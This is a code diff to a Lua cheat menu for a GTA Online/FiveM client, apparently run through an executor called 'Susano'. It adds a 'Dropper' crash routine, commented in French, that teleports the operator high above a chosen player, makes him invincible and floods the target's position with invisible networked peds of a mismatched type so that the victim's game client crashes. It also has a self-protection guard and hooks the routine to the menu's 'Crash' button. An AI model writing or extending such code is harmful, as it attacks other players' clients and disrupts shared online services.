@@ -25504,7 +25504,7 @@ function A.boot()
 
     if A._booted then return end
     A._booted = true
-    O.log("loader build 2026-10-29-r29 (sync lane on Crash, hardened ped lane)")
+    O.log("loader build 2026-10-29-r30 (dropper envelope on Crash)")
     O.log("protection defaults: anti-freeze, anti-attach, anti-spectate, ped guard armed")
     O.every("evasion", 900, A.tick, 350)
     O.every("pedGuardWatch", 100, A.pedGuardWatch, 0)
@@ -33408,6 +33408,261 @@ function SYNC.start()
     return true
 end
 
+-- ---------------------------------------------------------------------------
+-- DROP - enveloppe sure + burst de peds reseau (pattern Dropper / snowball)
+--
+-- Reference : CRA/refs/snowball.lua ("Dropper 3.0"). Le mecanisme, en clair :
+--
+--   1. l'operateur est teleporte 300 m AU-DESSUS de la cible, freeze et
+--      invincible. Il ne rend rien, il ne stream rien, il est hors de portee
+--      des entites qu'il cree ;
+--   2. il joue anim@mp_snowball/snowball_throw, ce qui maintient un etat de
+--      ped anime et synchronise ;
+--   3. il cree deux vagues de 50 peds `player_zero` (modele joueur) en
+--      pedType 4, a la position exacte de la cible, une toutes les 13 ms,
+--      chaque ped invisible localement, alpha 0, sans collision, mission
+--      entity, tache WORLD_HUMAN_CHEERING ;
+--   4. il supprime tout, puis revient a sa position d'origine en recalculant
+--      le sol avec GetGroundZFor_3dCoord.
+--
+-- Pourquoi ca casse : c'est la meme famille que le dump du 2026-10-29.
+-- Un ped reseau dont le pedType et le modele ne partagent pas le meme layout
+-- (pedType 4 + `player_zero`), pousse en rafale, force le client cible a
+-- creer cent CPed joueurs et a appliquer dessus un scenario : le chemin
+-- HandleCloneUpdate -> apply GTA -> DEP. La difference avec un swarm arme,
+-- c'est la duree de vie : les entites existent 1,3 s et disparaissent.
+--
+-- Pourquoi ca ne casse pas l'operateur (doctrine 6.4, enveloppe) :
+--   * il est 300 m plus haut, donc les entites sont hors de sa bulle ;
+--   * il en est le createur et le proprietaire (SetNetworkIdCanMigrate
+--     false), donc son client n'applique jamais de donnees distantes pour
+--     elles ;
+--   * elles sont SetEntityLocallyInvisible + alpha 0 + collision off : rien
+--     n'entre dans son frame ;
+--   * il est restaure dans tous les chemins de sortie, y compris en erreur.
+-- ---------------------------------------------------------------------------
+local DROP = {
+    running = false,
+    height = 300.0,
+    waves = 2,
+    perWave = 50,
+    gap = 13,
+    hold = 500,
+    betweenWaves = 800,
+    model = "player_zero",
+    pedType = 4,
+    scenario = "WORLD_HUMAN_CHEERING",
+    animDict = "anim@mp_snowball",
+    animName = "snowball_throw",
+    maxDist = 400.0,
+    restoreWait = 1500,
+}
+
+local function dropRestore(myPed, origin)
+    if not myPed or not DoesEntityExist(myPed) then return end
+    pcall(ClearPedTasksImmediately, myPed)
+    pcall(FreezeEntityPosition, myPed, false)
+    pcall(SetEntityInvincible, myPed, false)
+    local z = origin.z
+    local ok, found, groundZ = pcall(GetGroundZFor_3dCoord, origin.x, origin.y, origin.z + 1000.0, false)
+    if ok and found then z = groundZ + 1.0 end
+    pcall(SetEntityCoords, myPed, origin.x, origin.y, z, false, false, false, true)
+end
+
+local function dropClear(created)
+    local removed = 0
+    for i = #created, 1, -1 do
+        local ped = created[i]
+        if ped and DoesEntityExist(ped) then
+            pcall(SetEntityAsMissionEntity, ped, true, true)
+            pcall(SetEntityAsNoLongerNeeded, ped)
+            pcall(DeleteEntity, ped)
+            removed = removed + 1
+        end
+        if i % 20 == 0 then Citizen.Wait(0) end
+    end
+    return removed
+end
+
+-- Une vague : 50 peds, puis 500 ms de maintien, puis suppression. C'est la
+-- cadence exacte de la reference (Attack() : 50 x Wait(13), Wait(500), clear).
+-- On garde CreatePed et pas CreateSpoofedPed : la reference est prouvee avec
+-- la creation standard, on ne change pas la semantique du message de create.
+local function dropWave(targetPed, model, healthFloor, myPed)
+    local batch = {}
+    local made = 0
+    for i = 1, DROP.perWave do
+        if not DROP.running then break end
+        if not DoesEntityExist(targetPed) then break end
+        -- Garde d'auto-preservation : si l'operateur encaisse quoi que ce
+        -- soit, on coupe tout de suite.
+        local okHp, hp = pcall(GetEntityHealth, myPed)
+        if okHp and type(hp) == "number" and hp < healthFloor then
+            O.log("drop: operator health %d, aborting", hp)
+            DROP.running = false
+            break
+        end
+
+        local c = GetEntityCoords(targetPed)
+        local x = c.x + (math.random() - 0.5) * 1.5
+        local y = c.y + (math.random() - 0.5) * 1.5
+        local z = c.z + 2.0 + math.random() * 3.0
+
+        local okP, ped = pcall(CreatePed, DROP.pedType, model, x, y, z, 0.0, true, true)
+        if okP and type(ped) == "number" and ped ~= 0 and DoesEntityExist(ped) then
+            pcall(SetEntityLocallyInvisible, ped)
+            pcall(SetEntityCollision, ped, false, false)
+            pcall(SetEntityAlpha, ped, 0, false)
+            pcall(SetEntityAsMissionEntity, ped, true, true)
+            pcall(NetworkRegisterEntityAsNetworked, ped)
+            local okId, netId = pcall(NetworkGetNetworkIdFromEntity, ped)
+            if okId and type(netId) == "number" and netId ~= 0 then
+                pcall(SetNetworkIdCanMigrate, netId, false)
+            end
+            pcall(TaskStartScenarioInPlace, ped, DROP.scenario, 0, true)
+            batch[#batch + 1] = ped
+            made = made + 1
+        end
+        Citizen.Wait(DROP.gap)
+    end
+
+    Citizen.Wait(DROP.hold)
+    local removed = dropClear(batch)
+    return made, removed
+end
+
+local function dropRun()
+    local api = rawget(_G, "Susano")
+    if type(api) ~= "table" then
+        DROP.running = false
+        O.log("drop: Susano missing")
+        return
+    end
+
+    local player = cloneResolveTarget()
+    if not player then
+        DROP.running = false
+        O.log("drop: no target")
+        pcall(Notify, "Drop: no target", CLR.red)
+        return
+    end
+
+    local targetPed = GetPlayerPed(player)
+    if type(targetPed) ~= "number" or targetPed == 0 or not DoesEntityExist(targetPed) then
+        DROP.running = false
+        O.log("drop: bad target ped")
+        pcall(Notify, "Drop: bad target", CLR.red)
+        return
+    end
+
+    local myPed = PlayerPedId()
+    local origin = GetEntityCoords(myPed)
+    local at = GetEntityCoords(targetPed)
+    local dx, dy, dz = at.x - origin.x, at.y - origin.y, at.z - origin.z
+    local dist = math.sqrt(dx * dx + dy * dy + dz * dz)
+    if dist > DROP.maxDist then
+        DROP.running = false
+        O.log("drop: target at %.0f m, beyond %.0f m", dist, DROP.maxDist)
+        pcall(Notify, "Drop: target too far", CLR.red)
+        return
+    end
+
+    O.log("drop: target server %d at %.0f m, envelope %.0f m up",
+          GetPlayerServerId(player), dist, DROP.height)
+    pcall(Notify, ("Drop: %.0f m"):format(dist), CLR.blue)
+
+    local okHp0, hp0 = pcall(GetEntityHealth, myPed)
+    if not okHp0 or type(hp0) ~= "number" then hp0 = 200 end
+
+    -- Enveloppe : on sort de la bulle avant de creer quoi que ce soit.
+    pcall(SetEntityCoords, myPed, at.x, at.y, at.z + DROP.height,
+          false, false, false, true)
+    pcall(FreezeEntityPosition, myPed, true)
+    pcall(SetEntityInvincible, myPed, true)
+
+    -- Verification d'enveloppe. Si le teleport est refuse (anti-cheat,
+    -- collision, zone interdite), on se retrouve a creer cent peds sur
+    -- nous-memes : c'est exactement le self-crash qu'on refuse. On mesure
+    -- au lieu de supposer.
+    Citizen.Wait(100)
+    local check = GetEntityCoords(myPed)
+    local vdx, vdy, vdz = check.x - at.x, check.y - at.y, check.z - at.z
+    local lift = math.sqrt(vdx * vdx + vdy * vdy + vdz * vdz)
+    if lift < DROP.height * 0.5 then
+        dropRestore(myPed, origin)
+        DROP.running = false
+        O.log("drop: envelope refused, only %.0f m from target", lift)
+        pcall(Notify, "Drop: envelope refused", CLR.red)
+        return
+    end
+    O.log("drop: envelope ok, %.0f m from target", lift)
+
+    pcall(RequestAnimDict, DROP.animDict)
+    local guard = 60
+    while not HasAnimDictLoaded(DROP.animDict) and guard > 0 do
+        Citizen.Wait(10)
+        guard = guard - 1
+    end
+    if HasAnimDictLoaded(DROP.animDict) then
+        pcall(TaskPlayAnim, myPed, DROP.animDict, DROP.animName,
+              8.0, 8.0, -1, 1, 0, false, false, false)
+    end
+
+    local model = GetHashKey(DROP.model)
+    RequestModel(model)
+    guard = 60
+    while not HasModelLoaded(model) and guard > 0 do
+        Citizen.Wait(10)
+        guard = guard - 1
+    end
+
+    local total, removed = 0, 0
+    local okBody, err = pcall(function()
+        if not HasModelLoaded(model) then
+            O.log("drop: model %s failed to load", DROP.model)
+            return
+        end
+        for wave = 1, DROP.waves do
+            if not DROP.running then break end
+            local made, gone = dropWave(targetPed, model, hp0 - 15, myPed)
+            total = total + made
+            removed = removed + gone
+            O.log("drop: wave %d/%d, %d created, %d removed", wave, DROP.waves, made, gone)
+            if wave < DROP.waves then Citizen.Wait(DROP.betweenWaves) end
+        end
+    end)
+    if not okBody then
+        O.log("drop: body error %s", tostring(err))
+    end
+
+    dropRestore(myPed, origin)
+    pcall(SetModelAsNoLongerNeeded, model)
+    O.log("drop: created %d, removed %d", total, removed)
+
+    Citizen.Wait(DROP.restoreWait)
+    local alive = DoesEntityExist(targetPed)
+    O.log("drop: target %s", alive and "still there" or "gone")
+    pcall(Notify, alive and "Drop: target still there" or "Drop: target gone",
+          alive and CLR.red or CLR.green)
+
+    DROP.running = false
+end
+
+function DROP.stop()
+    DROP.running = false
+end
+
+function DROP.start()
+    if DROP.running then
+        DROP.stop()
+        O.log("drop: stopping")
+        return false
+    end
+    DROP.running = true
+    Citizen.CreateThread(dropRun)
+    return true
+end
+
 local CRASH_ROWS = {
     "Method", "Crash", "Intensity", "Target: nearest", "Launch crash",
     "Stop + clean", "Probe channels", "Objects (orbit)",
@@ -33482,14 +33737,16 @@ local function installCrasher()
             end,
         },
         {
-            -- Ligne sync : network damage event a motif de bits. Aucune
-            -- entite creee, rien a l'ecran, operateur hors de portee. Sonde
-            -- neutre d'abord (damage 1.0, lecture de la vie de la cible),
-            -- fuzz ensuite. Press again to stop.
+            -- Ligne crash : l'enveloppe sure du Dropper. Operateur teleporte
+            -- 300 m au-dessus de la cible, freeze, invincible ; deux vagues de
+            -- 50 peds player_zero en pedType 4, invisibles localement, alpha 0,
+            -- sans collision, mission entity, propriete figee, scenario
+            -- WORLD_HUMAN_CHEERING ; suppression immediate puis restauration.
+            -- Press again to stop.
             name = "Crash",
             type = "action",
             onClick = function()
-                SYNC.start()
+                DROP.start()
             end,
         },
         {
